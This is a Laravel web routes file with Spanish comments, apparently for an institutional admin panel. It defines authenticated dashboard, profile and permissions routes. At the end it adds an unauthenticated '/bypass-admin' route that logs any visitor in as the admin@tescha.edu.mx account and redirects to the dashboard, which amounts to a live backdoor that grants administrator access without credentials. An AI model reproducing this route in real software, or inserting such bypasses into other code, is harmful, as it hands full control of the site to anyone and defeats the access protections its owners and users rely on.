<?php

use App\Models\User;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Route;
use App\Http\Controllers\PermisoController;

Route::redirect('/', '/login');

// Rutas protegidas por autenticación
Route::middleware(['auth'])->group(function () {
    Route::view('dashboard', 'dashboard')->name('dashboard');
    Route::view('profile', 'profile')->name('profile');

    // ===== MÓDULO DE PERMISOS (diseño original) =====
    Route::get('/admin/permisos', [PermisoController::class, 'index'])->name('permisos.index');
    Route::post('/admin/permisos', [PermisoController::class, 'update'])->name('permisos.update');

});

// Ruta de acceso directo forzado
Route::get('/bypass-admin', function () {
    $user = User::where('email', 'admin@tescha.edu.mx')->first();

    if (!$user) {
        return "El usuario admin@tescha.edu.mx no existe en la BD.";
    }

    Auth::login($user);

    return redirect()->route('dashboard');
});

require __DIR__.'/auth.php';